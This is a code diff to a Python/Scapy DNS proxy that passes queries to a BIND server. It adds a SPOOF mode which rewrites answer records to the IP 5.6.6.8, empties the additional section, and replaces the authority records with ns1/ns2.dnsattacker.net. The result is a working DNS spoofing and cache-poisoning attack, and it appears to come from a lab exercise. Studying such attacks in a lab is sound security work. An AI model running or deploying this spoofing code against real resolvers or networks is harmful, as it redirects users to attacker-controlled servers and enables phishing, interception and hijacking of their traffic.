@@ -36,17 +36,45 @@ print 'starting server'
 while True:
     #get data from listen port
     data, addr = s_client.recvfrom(1024)
-    print 'Connected by'+ str(addr)
+    #print 'Connected by'+ str(addr)
 
+    #convert response data to DNS format
     response_listen = DNS(data)
-    print response_listen.show()
+    #print response_listen.show()
 
-    #once we got data, we send to BIND
+    #once we got DNS data, we send to BIND
     s_send.sendto(str(data), (HOST, dns_port))
     response = s_send.recv(4096)
     response = DNS(response)
 
-    #once we got data from BIND, we send it back to client
+    #once we got DNS response from BIND,
+    # depending on the value SPOOF is true or not, we modify it send it back to client or just send it client
+    #print response.ns.show()
+    if SPOOF == True:
+        #modify the IP
+        if response.an != None:
+            response.an.rdata = "5.6.6.8"
+            print response.an.rdata
+        #empty the ar field
+        if response.ar != None:
+            response.ar = ""
+        limit = max(response.nscount, 2)
+        #modify the NS field to attach ns server
+        for count in xrange(limit - 1, -1 ,-1 ):
+            if count <= 1:
+                if count == 0 and response.ns[0] != None:
+                    response.ns[0].rdata = "ns1.dnsattacker.net"
+                if count == 0 and response.ns[0] == None:
+                    response.ns[0] = response.an
+                    response.ns[0].rdata = "ns1.dnsattacker.net"
+                    response.ns[0].type = "NS"
+
+                if count == 1 and response.nscount > 1:
+                    response.ns[1].rdata = "ns2.dnsattacker.net"
+            else:
+                del response.ns[count]
+
+    #send response to client
     s_client.sendto(str(response), (addr[0], addr[1]))
 
 
